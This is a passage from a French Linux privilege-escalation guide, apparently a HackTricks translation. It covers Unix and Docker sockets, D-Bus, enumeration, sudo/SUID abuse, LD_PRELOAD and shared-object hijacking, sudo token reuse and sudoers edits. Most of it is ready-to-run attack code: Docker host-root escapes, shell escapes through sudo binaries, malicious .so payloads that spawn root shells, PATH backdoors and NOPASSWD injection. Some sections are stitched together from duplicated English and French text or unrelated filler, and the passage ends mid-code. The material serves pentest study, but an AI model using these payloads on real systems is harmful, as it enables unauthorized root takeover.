* `Accept` : Prend un argument booléen. Si **true**, une **instance de service est lancée pour chaque connexion entrante** et seul le socket de connexion est transmis. Si **false**, tous les sockets d'écoute eux-mêmes sont **transmis à l'unité de service démarrée**, et une seule unité de service est lancée pour toutes les connexions. Cette valeur est ignorée pour les sockets de datagramme et les FIFO où une seule unité de service gère inconditionnellement tout le trafic entrant. **Par défaut à false**. Pour des raisons de performance, il est recommandé d'écrire de nouveaux démons de manière à ce qu'ils soient adaptés à `Accept=no`.
* `ExecStartPre`, `ExecStartPost` : Prend une ou plusieurs lignes de commande, qui sont **exécutées avant** ou **après** la création et la liaison des **sockets**/FIFO d'écoute, respectivement. Le premier jeton de la ligne de commande doit être un nom de fichier absolu, suivi des arguments pour le processus.
* `ExecStopPre`, `ExecStopPost` : Commandes supplémentaires qui sont **exécutées avant** ou **après** la fermeture et la suppression des **sockets**/FIFO d'écoute, respectivement.
* `Service` : Spécifie le nom de l'**unité de service à activer** sur le **trafic entrant**. Ce paramètre n'est autorisé que pour les sockets avec Accept=no. Par défaut, il correspond au service portant le même nom que le socket (avec le suffixe remplacé). Dans la plupart des cas, il ne devrait pas être nécessaire d'utiliser cette option.

### Fichiers .socket modifiables

Si vous trouvez un fichier `.socket` **modifiable**, vous pouvez **ajouter** au début de la section `[Socket]` quelque chose comme : `ExecStartPre=/home/kali/sys/backdoor` et la porte dérobée sera exécutée avant la création du socket. Par conséquent, vous devrez **probablement attendre que la machine soit redémarrée.**\
Notez que le système doit utiliser cette configuration de fichier de socket, sinon la porte dérobée ne sera pas exécutée.

### Sockets modifiables

Si vous **identifiez un socket modifiable** (_maintenant nous parlons de Unix Sockets et non des fichiers de configuration `.socket`_), alors **vous pouvez communiquer** avec ce socket et peut-être exploiter une vulnérabilité.

### Énumérer les Unix Sockets
```bash
netstat -a -p --unix
```
### Connexion brute

When performing a penetration test, it is common to gain initial access to a target system with limited privileges. However, the ultimate goal is often to escalate those privileges and gain full control over the system. One technique that can be used to achieve this is called privilege escalation.

During a privilege escalation attack, the attacker attempts to exploit vulnerabilities or misconfigurations in the target system to gain higher levels of access and control. This can involve exploiting weak file permissions, misconfigured services, or vulnerable software.

One method of privilege escalation is through a raw connection. A raw connection allows the attacker to directly interact with the underlying operating system, bypassing any restrictions or limitations imposed by higher-level applications or services.

To establish a raw connection, the attacker typically leverages a vulnerability or misconfiguration in a privileged service or application. This can include exploiting a vulnerable kernel module, a misconfigured sudoers file, or a weakly protected privileged binary.

Once a raw connection is established, the attacker can execute commands with elevated privileges, manipulate system files, and perform other actions that would otherwise be restricted. This can allow the attacker to gain full control over the target system and potentially move laterally within the network.

It is important to note that privilege escalation attacks should only be performed with proper authorization and in a controlled environment, such as during a penetration test. Unauthorized privilege escalation is illegal and unethical.

By understanding the techniques and methods used in privilege escalation attacks, system administrators and security professionals can better protect their systems and networks from potential threats.
```bash
#apt-get install netcat-openbsd
nc -U /tmp/socket  #Connect to UNIX-domain stream socket
nc -uU /tmp/socket #Connect to UNIX-domain datagram socket

#apt-get install socat
socat - UNIX-CLIENT:/dev/socket #connect to UNIX-domain socket, irrespective of its type
```
**Exemple d'exploitation :**

{% content-ref url="socket-command-injection.md" %}
[socket-command-injection.md](socket-command-injection.md)
{% endcontent-ref %}

### Sockets HTTP

Notez qu'il peut y avoir des **sockets en écoute pour les requêtes HTTP** (_Je ne parle pas des fichiers .socket mais des fichiers agissant en tant que sockets Unix_). Vous pouvez vérifier cela avec :
```bash
curl --max-time 2 --unix-socket /pat/to/socket/files http:/index
```
Si le socket répond avec une requête HTTP, alors vous pouvez communiquer avec lui et peut-être exploiter une vulnérabilité.

### Socket Docker inscriptible

Le socket Docker est généralement situé à `/var/run/docker.sock` et n'est inscriptible que par l'utilisateur `root` et le groupe `docker`.\
Si, pour une raison quelconque, vous avez des permissions d'écriture sur ce socket, vous pouvez escalader les privilèges.\
Les commandes suivantes peuvent être utilisées pour escalader les privilèges :
```bash
docker -H unix:///var/run/docker.sock run -v /:/host -it ubuntu chroot /host /bin/bash
docker -H unix:///var/run/docker.sock run -it --privileged --pid=host debian nsenter -t 1 -m -u -n -i sh
```
#### Utiliser l'API web de Docker à partir du socket sans le package Docker

Si vous avez accès au **socket Docker** mais que vous ne pouvez pas utiliser le binaire Docker (peut-être qu'il n'est même pas installé), vous pouvez utiliser l'API web directement avec `curl`.

Les commandes suivantes sont un exemple de la façon de **créer un conteneur Docker qui monte la racine** du système hôte et utilise `socat` pour exécuter des commandes dans le nouveau conteneur Docker.
```bash
# List docker images
curl -XGET --unix-socket /var/run/docker.sock http://localhost/images/json
#[{"Containers":-1,"Created":1588544489,"Id":"sha256:<ImageID>",...}]
# Send JSON to docker API to create the container
curl -XPOST -H "Content-Type: application/json" --unix-socket /var/run/docker.sock -d '{"Image":"<ImageID>","Cmd":["/bin/sh"],"DetachKeys":"Ctrl-p,Ctrl-q","OpenStdin":true,"Mounts":[{"Type":"bind","Source":"/","Target":"/host_root"}]}' http://localhost/containers/create
#{"Id":"<NewContainerID>","Warnings":[]}
curl -XPOST --unix-socket /var/run/docker.sock http://localhost/containers/<NewContainerID>/start
```
La dernière étape consiste à utiliser `socat` pour établir une connexion avec le conteneur, en envoyant une demande "attach".
```bash
socat - UNIX-CONNECT:/var/run/docker.sock
POST /containers/<NewContainerID>/attach?stream=1&stdin=1&stdout=1&stderr=1 HTTP/1.1
Host:
Connection: Upgrade
Upgrade: tcp

#HTTP/1.1 101 UPGRADED
#Content-Type: application/vnd.docker.raw-stream
#Connection: Upgrade
#Upgrade: tcp
```
Maintenant, vous pouvez exécuter des commandes sur le conteneur à partir de cette connexion `socat`.

### Autres

Notez que si vous avez des permissions d'écriture sur le socket Docker parce que vous êtes **dans le groupe `docker`**, vous avez [**plusieurs façons d'escalader les privilèges**](interesting-groups-linux-pe/#docker-group). Si l'[**API Docker écoute sur un port**, vous pouvez également compromettre celle-ci](../../network-services-pentesting/2375-pentesting-docker.md#compromising).

Consultez **d'autres façons de s'échapper de Docker ou de l'exploiter pour escalader les privilèges** dans :

{% content-ref url="docker-security/" %}
[docker-security](docker-security/)
{% endcontent-ref %}

## Élévation de privilèges de Containerd (ctr)

Si vous constatez que vous pouvez utiliser la commande **`ctr`**, lisez la page suivante car **vous pourriez l'exploiter pour escalader les privilèges** :

{% content-ref url="containerd-ctr-privilege-escalation.md" %}
[containerd-ctr-privilege-escalation.md](containerd-ctr-privilege-escalation.md)
{% endcontent-ref %}

## Élévation de privilèges de **RunC**

Si vous constatez que vous pouvez utiliser la commande **`runc`**, lisez la page suivante car **vous pourriez l'exploiter pour escalader les privilèges** :

{% content-ref url="runc-privilege-escalation.md" %}
[runc-privilege-escalation.md](runc-privilege-escalation.md)
{% endcontent-ref %}

## **D-Bus**

D-BUS est un **système de communication inter-processus (IPC)**, fournissant un mécanisme simple mais puissant **permettant aux applications de communiquer entre elles**, d'échanger des informations et de demander des services. D-BUS a été conçu dès le départ pour répondre aux besoins d'un système Linux moderne.

En tant que système IPC et objet complet, D-BUS a plusieurs utilisations prévues. Tout d'abord, D-BUS peut effectuer une IPC d'application de base, permettant à un processus de transférer des données à un autre - pensez aux **sockets de domaine UNIX améliorées**. Deuxièmement, D-BUS peut faciliter l'envoi d'événements, ou signaux, à travers le système, permettant aux différents composants du système de communiquer et finalement de mieux s'intégrer. Par exemple, un démon Bluetooth peut envoyer un signal d'appel entrant que votre lecteur de musique peut intercepter, en baissant le volume jusqu'à la fin de l'appel. Enfin, D-BUS implémente un système d'objet distant, permettant à une application de demander des services et d'appeler des méthodes à partir d'un objet différent - pensez à CORBA sans les complications. (À partir de [ici](https://www.linuxjournal.com/article/7744)).

D-Bus utilise un modèle **autoriser/refuser**, où chaque message (appel de méthode, émission de signal, etc.) peut être **autorisé ou refusé** en fonction de la somme de toutes les règles de politique qui le correspondent. Chaque règle de la politique doit avoir l'attribut `own`, `send_destination` ou `receive_sender` défini.

Partie de la politique de `/etc/dbus-1/system.d/wpa_supplicant.conf` :
```markup
<policy user="root">
<allow own="fi.w1.wpa_supplicant1"/>
<allow send_destination="fi.w1.wpa_supplicant1"/>
<allow send_interface="fi.w1.wpa_supplicant1"/>
<allow receive_sender="fi.w1.wpa_supplicant1" receive_type="signal"/>
</policy>
```
Par conséquent, si une politique permet à votre utilisateur d'**interagir avec le bus** de quelque manière que ce soit, vous pourriez l'exploiter pour escalader les privilèges (peut-être simplement pour rechercher des mots de passe ?).

Notez qu'une **politique** qui ne **spécifie aucun utilisateur ou groupe** affecte tout le monde (`<policy>`).\
Les politiques du contexte "default" affectent tout le monde qui n'est pas affecté par d'autres politiques (`<policy context="default"`).

**Apprenez comment énumérer et exploiter une communication D-Bus ici :**

{% content-ref url="d-bus-enumeration-and-command-injection-privilege-escalation.md" %}
[d-bus-enumeration-and-command-injection-privilege-escalation.md](d-bus-enumeration-and-command-injection-privilege-escalation.md)
{% endcontent-ref %}

## **Réseau**

Il est toujours intéressant d'énumérer le réseau et de déterminer la position de la machine.

### Énumération générique
```bash
#Hostname, hosts and DNS
cat /etc/hostname /etc/hosts /etc/resolv.conf
dnsdomainname

#Content of /etc/inetd.conf & /etc/xinetd.conf
cat /etc/inetd.conf /etc/xinetd.conf

#Interfaces
cat /etc/networks
(ifconfig || ip a)

#Neighbours
(arp -e || arp -a)
(route || ip n)

#Iptables rules
(timeout 1 iptables -L 2>/dev/null; cat /etc/iptables/* | grep -v "^#" | grep -Pv "\W*\#" 2>/dev/null)

#Files used by network services
lsof -i
```
### Ports ouverts

Vérifiez toujours les services réseau en cours d'exécution sur la machine avec laquelle vous n'avez pas pu interagir avant d'y accéder :
```bash
(netstat -punta || ss --ntpu)
(netstat -punta || ss --ntpu) | grep "127.0"
```
### Sniffing

Vérifiez si vous pouvez renifler le trafic. Si c'est le cas, vous pourriez être en mesure de récupérer certaines informations d'identification.
```
timeout 1 tcpdump
```
## Utilisateurs

### Énumération générique

Vérifiez **qui** vous êtes, quels **privilèges** vous avez, quels **utilisateurs** sont présents dans le système, lesquels peuvent **se connecter** et lesquels ont des **privilèges root** :
```bash
#Info about me
id || (whoami && groups) 2>/dev/null
#List all users
cat /etc/passwd | cut -d: -f1
#List users with console
cat /etc/passwd | grep "sh$"
#List superusers
awk -F: '($3 == "0") {print}' /etc/passwd
#Currently logged users
w
#Login history
last | tail
#Last log of each user
lastlog

#List all users and their groups
for i in $(cut -d":" -f1 /etc/passwd 2>/dev/null);do id $i;done 2>/dev/null | sort
#Current user PGP keys
gpg --list-keys 2>/dev/null
```
### Grand UID

Certaines versions de Linux étaient affectées par un bug qui permettait aux utilisateurs avec un **UID > INT\_MAX** d'escalader leurs privilèges. Plus d'informations : [ici](https://gitlab.freedesktop.org/polkit/polkit/issues/74), [ici](https://github.com/mirchr/security-research/blob/master/vulnerabilities/CVE-2018-19788.sh) et [ici](https://twitter.com/paragonsec/status/1071152249529884674).\
**Exploitez-le** en utilisant : **`systemd-run -t /bin/bash`**

### Groupes

Vérifiez si vous êtes **membre d'un groupe** qui pourrait vous accorder des privilèges root :

{% content-ref url="interesting-groups-linux-pe/" %}
[interesting-groups-linux-pe](interesting-groups-linux-pe/)
{% endcontent-ref %}

### Presse-papiers

Vérifiez si quelque chose d'intéressant se trouve dans le presse-papiers (si possible)
```bash
if [ `which xclip 2>/dev/null` ]; then
echo "Clipboard: "`xclip -o -selection clipboard 2>/dev/null`
echo "Highlighted text: "`xclip -o 2>/dev/null`
elif [ `which xsel 2>/dev/null` ]; then
echo "Clipboard: "`xsel -ob 2>/dev/null`
echo "Highlighted text: "`xsel -o 2>/dev/null`
else echo "Not found xsel and xclip"
fi
```
### Politique de mot de passe

A strong password policy is essential for maintaining the security of a system. It helps prevent unauthorized access and protects sensitive information. Here are some key considerations for implementing an effective password policy:

- **Password Complexity**: Require passwords to be a combination of uppercase and lowercase letters, numbers, and special characters. This increases the difficulty of guessing or cracking passwords.

- **Password Length**: Set a minimum password length to ensure that passwords are not easily guessable. A longer password is generally more secure.

- **Password Expiration**: Enforce regular password changes to reduce the risk of compromised passwords. Users should be prompted to change their passwords after a certain period of time.

- **Password History**: Maintain a password history to prevent users from reusing old passwords. This ensures that users choose new and unique passwords each time.

- **Account Lockout**: Implement an account lockout policy to protect against brute-force attacks. After a certain number of failed login attempts, the account should be locked for a specified period of time.

- **Password Storage**: Store passwords securely using strong encryption algorithms. Avoid storing passwords in plain text or weakly hashed formats.

By implementing a robust password policy, you can significantly enhance the security of your system and protect against unauthorized access.
```bash
grep "^PASS_MAX_DAYS\|^PASS_MIN_DAYS\|^PASS_WARN_AGE\|^ENCRYPT_METHOD" /etc/login.defs
```
### Mots de passe connus

Si vous **connaissez un mot de passe** de l'environnement, essayez de vous connecter en tant que chaque utilisateur en utilisant le mot de passe.

### Brute-force de su

Si vous ne vous souciez pas de faire beaucoup de bruit et que les binaires `su` et `timeout` sont présents sur l'ordinateur, vous pouvez essayer de forcer l'utilisateur en utilisant [su-bruteforce](https://github.com/carlospolop/su-bruteforce).\
[**Linpeas**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite) avec le paramètre `-a` essaie également de forcer les utilisateurs.

## Abus de PATH en écriture

### $PATH

Si vous découvrez que vous pouvez **écrire dans un dossier du $PATH**, vous pourriez être en mesure d'escalader les privilèges en **créant une porte dérobée dans le dossier inscriptible** avec le nom d'une commande qui sera exécutée par un autre utilisateur (idéalement root) et qui n'est **pas chargée à partir d'un dossier situé avant** votre dossier inscriptible dans $PATH.

### SUDO et SUID

Il se peut que vous soyez autorisé à exécuter une commande en utilisant sudo ou qu'elle ait le bit suid. Vérifiez cela en utilisant :
```bash
sudo -l #Check commands you can execute with sudo
find / -perm -4000 2>/dev/null #Find all SUID binaries
```
Certains **commandes inattendues vous permettent de lire et/ou écrire des fichiers, voire même d'exécuter une commande**. Par exemple :
```bash
sudo awk 'BEGIN {system("/bin/sh")}'
sudo find /etc -exec sh -i \;
sudo tcpdump -n -i lo -G1 -w /dev/null -z ./runme.sh
sudo tar c a.tar -I ./runme.sh a
ftp>!/bin/sh
less>! <shell_comand>
```
### NOPASSWD

La configuration de Sudo peut permettre à un utilisateur d'exécuter une commande avec les privilèges d'un autre utilisateur sans connaître le mot de passe.
```
$ sudo -l
User demo may run the following commands on crashlab:
(root) NOPASSWD: /usr/bin/vim
```
Dans cet exemple, l'utilisateur `demo` peut exécuter `vim` en tant que `root`, il est maintenant trivial d'obtenir un shell en ajoutant une clé ssh dans le répertoire root ou en appelant `sh`.
```
sudo vim -c '!sh'
```
### SETENV

Cette directive permet à l'utilisateur de **définir une variable d'environnement** lors de l'exécution d'une commande :
```bash
$ sudo -l
User waldo may run the following commands on admirer:
(ALL) SETENV: /opt/scripts/admin_tasks.sh
```
Cet exemple, **basé sur la machine HTB Admirer**, était **vulnérable** à **l'hijacking PYTHONPATH** pour charger une bibliothèque python arbitraire lors de l'exécution du script en tant que root:
```bash
sudo PYTHONPATH=/dev/shm/ /opt/scripts/admin_tasks.sh
```
### Contournement de l'exécution de Sudo en contournant les chemins

**Sautez** pour lire d'autres fichiers ou utilisez des **liens symboliques**. Par exemple, dans le fichier sudoers : _hacker10 ALL= (root) /bin/less /var/log/\*_
```bash
sudo less /var/logs/anything
less>:e /etc/shadow #Jump to read other files using privileged less
```

```bash
ln /etc/shadow /var/log/new
sudo less /var/log/new #Use symlinks to read any file
```
Si un **joker** est utilisé (\*), c'est encore plus facile :
```bash
sudo less /var/log/../../etc/shadow #Read shadow
sudo less /var/log/something /etc/shadow #Red 2 files
```
**Contremesures**: [https://blog.compass-security.com/2012/10/dangerous-sudoers-entries-part-5-recapitulation/](https://blog.compass-security.com/2012/10/dangerous-sudoers-entries-part-5-recapitulation/)

### Commande sudo/binaire SUID sans chemin de commande

Si la **permission sudo** est accordée à une seule commande **sans spécifier le chemin**: _hacker10 ALL= (root) less_, vous pouvez l'exploiter en modifiant la variable PATH.
```bash
export PATH=/tmp:$PATH
#Put your backdoor in /tmp and name it "less"
sudo less
```
Cette technique peut également être utilisée si un binaire **suid** exécute une autre commande sans spécifier le chemin d'accès (vérifiez toujours avec **strings** le contenu d'un binaire SUID suspect).

[Exemples de charges utiles à exécuter.](payloads-to-execute.md)

### Binaire SUID avec chemin de commande

Si le binaire **suid** exécute une autre commande en spécifiant le chemin d'accès, vous pouvez essayer d'**exporter une fonction** portant le nom de la commande que le fichier suid appelle.

Par exemple, si un binaire suid appelle _**/usr/sbin/service apache2 start**_, vous devez essayer de créer la fonction et de l'exporter :
```bash
function /usr/sbin/service() { cp /bin/bash /tmp && chmod +s /tmp/bash && /tmp/bash -p; }
export -f /usr/sbin/service
```
Ensuite, lorsque vous appelez le binaire suid, cette fonction sera exécutée.

### LD\_PRELOAD & **LD\_LIBRARY\_PATH**

**LD\_PRELOAD** est une variable d'environnement facultative contenant un ou plusieurs chemins vers des bibliothèques partagées, ou des objets partagés, que le chargeur chargera avant toute autre bibliothèque partagée, y compris la bibliothèque d'exécution C (libc.so). Cela s'appelle le préchargement d'une bibliothèque.

Pour éviter que ce mécanisme ne soit utilisé comme vecteur d'attaque pour les binaires exécutables _suid/sgid_, le chargeur ignore _LD\_PRELOAD_ si _ruid != euid_. Pour de tels binaires, seules les bibliothèques dans les chemins standard qui sont également _suid/sgid_ seront préchargées.

Si vous trouvez dans la sortie de **`sudo -l`** la phrase : _**env\_keep+=LD\_PRELOAD**_ et que vous pouvez appeler une commande avec sudo, vous pouvez escalader les privilèges.
```
Defaults        env_keep += LD_PRELOAD
```
Enregistrez sous **/tmp/pe.c**
```c
#include <stdio.h>
#include <sys/types.h>
#include <stdlib.h>

void _init() {
unsetenv("LD_PRELOAD");
setgid(0);
setuid(0);
system("/bin/bash");
}
```
Ensuite, **compilez-le** en utilisant la commande suivante :
```bash
cd /tmp
gcc -fPIC -shared -o pe.so pe.c -nostartfiles
```
Enfin, **élevez les privilèges** en exécutant
```bash
sudo LD_PRELOAD=./pe.so <COMMAND> #Use any command you can run with sudo
```
{% hint style="danger" %}
Une élévation de privilèges similaire peut être exploitée si l'attaquant contrôle la variable d'environnement **LD\_LIBRARY\_PATH** car il contrôle le chemin où les bibliothèques vont être recherchées.
{% endhint %}
```c
#include <stdio.h>
#include <stdlib.h>

static void hijack() __attribute__((constructor));

void hijack() {
unsetenv("LD_LIBRARY_PATH");
setresuid(0,0,0);
system("/bin/bash -p");
}
```

```bash
# Compile & execute
cd /tmp
gcc -o /tmp/libcrypt.so.1 -shared -fPIC /home/user/tools/sudo/library_path.c
sudo LD_LIBRARY_PATH=/tmp <COMMAND>
```
### Binaire SUID - Injection .so

Si vous trouvez un binaire étrange avec des permissions **SUID**, vous pouvez vérifier si tous les fichiers **.so** sont **chargés correctement**. Pour ce faire, vous pouvez exécuter :
```bash
strace <SUID-BINARY> 2>&1 | grep -i -E "open|access|no such file"
```
Par exemple, si vous trouvez quelque chose comme : _pen(“/home/user/.config/libcalc.so”, O\_RDONLY) = -1 ENOENT (Fichier ou répertoire introuvable)_, vous pouvez l'exploiter.

Créez le fichier _/home/user/.config/libcalc.c_ avec le code suivant :
```c
#include <stdio.h>
#include <stdlib.h>

static void inject() __attribute__((constructor));

void inject(){
system("cp /bin/bash /tmp/bash && chmod +s /tmp/bash && /tmp/bash -p");
}
```
Compilez-le en utilisant:
```bash
gcc -shared -o /home/user/.config/libcalc.so -fPIC /home/user/.config/libcalc.c
```
## Piratage d'objet partagé

Shared Object Hijacking is a technique used to exploit the dynamic linking process in Linux systems. It involves replacing a legitimate shared object file with a malicious one, which allows an attacker to execute arbitrary code with elevated privileges.

Le piratage d'objet partagé est une technique utilisée pour exploiter le processus de liaison dynamique dans les systèmes Linux. Elle consiste à remplacer un fichier d'objet partagé légitime par un fichier malveillant, ce qui permet à un attaquant d'exécuter du code arbitraire avec des privilèges élevés.

### Identifying Vulnerable Applications

To perform a shared object hijacking attack, you first need to identify vulnerable applications that load shared objects from user-writable directories. This can be done by analyzing the application's binary or by monitoring the system for dynamic library loads.

Pour effectuer une attaque de piratage d'objet partagé, vous devez d'abord identifier les applications vulnérables qui chargent des objets partagés à partir de répertoires accessibles en écriture par l'utilisateur. Cela peut être fait en analysant le binaire de l'application ou en surveillant le système pour les chargements de bibliothèques dynamiques.

### Creating a Malicious Shared Object

Once you have identified a vulnerable application, you can create a malicious shared object that will be loaded instead of the legitimate one. This can be achieved by compiling a C or C++ source code into a shared object file (.so).

Une fois que vous avez identifié une application vulnérable, vous pouvez créer un objet partagé malveillant qui sera chargé à la place de l'objet légitime. Cela peut être réalisé en compilant un code source C ou C++ en un fichier d'objet partagé (.so).

### Replacing the Legitimate Shared Object

To perform the attack, you need to replace the legitimate shared object file with your malicious one. This can be done by either overwriting the original file or by placing your malicious file in a directory that is searched before the legitimate one.

Pour effectuer l'attaque, vous devez remplacer le fichier d'objet partagé légitime par votre fichier malveillant. Cela peut être fait en écrasant le fichier d'origine ou en plaçant votre fichier malveillant dans un répertoire qui est recherché avant le fichier légitime.

### Executing Arbitrary Code

Once the vulnerable application is executed, it will load the malicious shared object instead of the legitimate one. This allows you to execute arbitrary code with elevated privileges, potentially gaining full control over the system.

Une fois que l'application vulnérable est exécutée, elle chargera l'objet partagé malveillant au lieu de l'objet légitime. Cela vous permet d'exécuter du code arbitraire avec des privilèges élevés, ce qui peut vous permettre de prendre le contrôle total du système.
```bash
# Lets find a SUID using a non-standard library
ldd some_suid
something.so => /lib/x86_64-linux-gnu/something.so

# The SUID also loads libraries from a custom location where we can write
readelf -d payroll  | grep PATH
0x000000000000001d (RUNPATH)            Library runpath: [/development]
```
Maintenant que nous avons trouvé un binaire SUID chargeant une bibliothèque à partir d'un dossier où nous pouvons écrire, créons la bibliothèque dans ce dossier avec le nom nécessaire :
```c
//gcc src.c -fPIC -shared -o /development/libshared.so
#include <stdio.h>
#include <stdlib.h>

static void hijack() __attribute__((constructor));

void hijack() {
setresuid(0,0,0);
system("/bin/bash -p");
}
```
Si vous obtenez une erreur telle que
```shell-session
./suid_bin: symbol lookup error: ./suid_bin: undefined symbol: a_function_name
```
Cela signifie que la bibliothèque que vous avez générée doit avoir une fonction appelée `a_function_name`.

### GTFOBins

[**GTFOBins**](https://gtfobins.github.io) est une liste organisée de binaires Unix qui peuvent être exploités par un attaquant pour contourner les restrictions de sécurité locales. [**GTFOArgs**](https://gtfoargs.github.io/) est la même chose, mais pour les cas où vous ne pouvez **injecter que des arguments** dans une commande.

Le projet recueille des fonctions légitimes des binaires Unix qui peuvent être utilisées de manière abusive pour échapper à des shells restreints, escalader ou maintenir des privilèges élevés, transférer des fichiers, générer des shells liés et inversés, et faciliter les autres tâches de post-exploitation.

> gdb -nx -ex '!sh' -ex quit\
> sudo mysql -e '! /bin/sh'\
> strace -o /dev/null /bin/sh\
> sudo awk 'BEGIN {system("/bin/sh")}'

{% embed url="https://gtfobins.github.io/" %}

{% embed url="https://gtfoargs.github.io/" %}

### FallOfSudo

Si vous pouvez accéder à `sudo -l`, vous pouvez utiliser l'outil [**FallOfSudo**](https://github.com/CyberOne-Security/FallofSudo) pour vérifier s'il trouve comment exploiter une règle sudo.

### Réutilisation des jetons sudo

Dans le scénario où **vous avez un shell en tant qu'utilisateur avec des privilèges sudo**, mais vous ne connaissez pas le mot de passe de l'utilisateur, vous pouvez **attendre qu'il/elle exécute une commande en utilisant `sudo`**. Ensuite, vous pouvez **accéder au jeton de la session où sudo a été utilisé et l'utiliser pour exécuter n'importe quoi en tant que sudo** (élévation de privilèges).

Conditions requises pour l'élévation des privilèges :

* Vous avez déjà un shell en tant qu'utilisateur "_sampleuser_"
* "_sampleuser_" a **utilisé `sudo`** pour exécuter quelque chose dans les **15 dernières minutes** (par défaut, c'est la durée du jeton sudo qui nous permet d'utiliser `sudo` sans entrer de mot de passe)
* `cat /proc/sys/kernel/yama/ptrace_scope` est 0
* `gdb` est accessible (vous devez pouvoir le télécharger)

(Vous pouvez temporairement activer `ptrace_scope` avec `echo 0 | sudo tee /proc/sys/kernel/yama/ptrace_scope` ou modifier de manière permanente `/etc/sysctl.d/10-ptrace.conf` et définir `kernel.yama.ptrace_scope = 0`)

Si toutes ces conditions sont remplies, **vous pouvez élever les privilèges en utilisant :** [**https://github.com/nongiach/sudo\_inject**](https://github.com/nongiach/sudo\_inject)

* La **première exploitation** (`exploit.sh`) créera le binaire `activate_sudo_token` dans _/tmp_. Vous pouvez l'utiliser pour **activer le jeton sudo dans votre session** (vous n'obtiendrez pas automatiquement un shell root, faites `sudo su`) :
```bash
bash exploit.sh
/tmp/activate_sudo_token
sudo su
```
* Le **deuxième exploit** (`exploit_v2.sh`) créera un shell sh dans _/tmp_ **appartenant à root avec setuid**
```bash
bash exploit_v2.sh
/tmp/sh -p
```
*Le **troisième exploit** (`exploit_v3.sh`) va **créer un fichier sudoers** qui rend les **jetons sudo éternels et permet à tous les utilisateurs d'utiliser sudo**.*
```bash
bash exploit_v3.sh
sudo su
```
### /var/run/sudo/ts/\<Nom d'utilisateur>

Si vous avez les **permissions d'écriture** dans le dossier ou sur l'un des fichiers créés à l'intérieur du dossier, vous pouvez utiliser le binaire [**write\_sudo\_token**](https://github.com/nongiach/sudo\_inject/tree/master/extra\_tools) pour **créer un jeton sudo pour un utilisateur et un PID**.\
Par exemple, si vous pouvez écraser le fichier _/var/run/sudo/ts/sampleuser_ et que vous avez un shell en tant qu'utilisateur avec le PID 1234, vous pouvez **obtenir des privilèges sudo** sans avoir besoin de connaître le mot de passe en faisant :
```bash
./write_sudo_token 1234 > /var/run/sudo/ts/sampleuser
```
### /etc/sudoers, /etc/sudoers.d

Le fichier `/etc/sudoers` et les fichiers à l'intérieur de `/etc/sudoers.d` configurent qui peut utiliser `sudo` et comment. Ces fichiers **par défaut ne peuvent être lus que par l'utilisateur root et le groupe root**.\
**Si** vous pouvez **lire** ce fichier, vous pourriez être en mesure d'**obtenir des informations intéressantes**, et si vous pouvez **écrire** dans n'importe quel fichier, vous pourrez **escalader les privilèges**.
```bash
ls -l /etc/sudoers /etc/sudoers.d/
ls -ld /etc/sudoers.d/
```
Si vous pouvez écrire, vous pouvez abuser de cette permission.
```bash
echo "$(whoami) ALL=(ALL) NOPASSWD: ALL" >> /etc/sudoers
echo "$(whoami) ALL=(ALL) NOPASSWD: ALL" >> /etc/sudoers.d/README
```
Une autre façon d'exploiter ces permissions :
```bash
# makes it so every terminal can sudo
echo "Defaults !tty_tickets" > /etc/sudoers.d/win
# makes it so sudo never times out
echo "Defaults timestamp_timeout=-1" >> /etc/sudoers.d/win
```
### DOAS

Il existe des alternatives au binaire `sudo` telles que `doas` pour OpenBSD, n'oubliez pas de vérifier sa configuration dans `/etc/doas.conf`.
```
permit nopass demo as root cmd vim
```
### Détournement de Sudo

Si vous savez qu'un **utilisateur se connecte généralement à une machine et utilise `sudo`** pour obtenir des privilèges élevés et que vous avez un shell dans le contexte de cet utilisateur, vous pouvez **créer un nouvel exécutable sudo** qui exécutera votre code en tant que root, puis la commande de l'utilisateur. Ensuite, **modifiez le $PATH** du contexte utilisateur (par exemple en ajoutant le nouveau chemin dans .bash\_profile) afin que lorsque l'utilisateur exécute sudo, votre exécutable sudo soit exécuté.

Notez que si l'utilisateur utilise un shell différent (pas bash), vous devrez modifier d'autres fichiers pour ajouter le nouveau chemin. Par exemple, [sudo-piggyback](https://github.com/APTy/sudo-piggyback) modifie `~/.bashrc`, `~/.zshrc`, `~/.bash_profile`. Vous pouvez trouver un autre exemple dans [bashdoor.py](https://github.com/n00py/pOSt-eX/blob/master/empire\_modules/bashdoor.py)

## Bibliothèque partagée

### ld.so

Le fichier `/etc/ld.so.conf` indique **d'où proviennent les fichiers de configuration chargés**. En général, ce fichier contient le chemin suivant : `include /etc/ld.so.conf.d/*.conf`

Cela signifie que les fichiers de configuration de `/etc/ld.so.conf.d/*.conf` seront lus. Ces fichiers de configuration **indiquent d'autres dossiers** dans lesquels les **bibliothèques** seront **recherchées**. Par exemple, le contenu de `/etc/ld.so.conf.d/libc.conf` est `/usr/local/lib`. **Cela signifie que le système recherchera les bibliothèques à l'intérieur de `/usr/local/lib`**.

Si, pour une raison quelconque, **un utilisateur dispose des permissions d'écriture** sur l'un des chemins indiqués : `/etc/ld.so.conf`, `/etc/ld.so.conf.d/`, n'importe quel fichier à l'intérieur de `/etc/ld.so.conf.d/` ou n'importe quel dossier dans le fichier de configuration à l'intérieur de `/etc/ld.so.conf.d/*.conf`, il peut être en mesure d'obtenir des privilèges élevés.\
Jetez un coup d'œil à **comment exploiter cette mauvaise configuration** dans la page suivante :

{% content-ref url="ld.so.conf-example.md" %}
[ld.so.conf-example.md](ld.so.conf-example.md)
{% endcontent-ref %}

### RPATH
```
level15@nebula:/home/flag15$ readelf -d flag15 | egrep "NEEDED|RPATH"
0x00000001 (NEEDED)                     Shared library: [libc.so.6]
0x0000000f (RPATH)                      Library rpath: [/var/tmp/flag15]

level15@nebula:/home/flag15$ ldd ./flag15
linux-gate.so.1 =>  (0x0068c000)
libc.so.6 => /lib/i386-linux-gnu/libc.so.6 (0x00110000)
/lib/ld-linux.so.2 (0x005bb000)
```
En copiant la bibliothèque dans `/var/tmp/flag15/`, elle sera utilisée par le programme à cet endroit tel que spécifié dans la variable `RPATH`.
```
level15@nebula:/home/flag15$ cp /lib/i386-linux-gnu/libc.so.6 /var/tmp/flag15/

level15@nebula:/home/flag15$ ldd ./flag15
linux-gate.so.1 =>  (0x005b0000)
libc.so.6 => /var/tmp/flag15/libc.so.6 (0x00110000)
/lib/ld-linux.so.2 (0x00737000)
```
Ensuite, créez une bibliothèque malveillante dans `/var/tmp` avec `gcc -fPIC -shared -static-libgcc -Wl,--version-script=version,-Bstatic exploit.c -o libc.so.6`
```c
#include<stdlib.h>
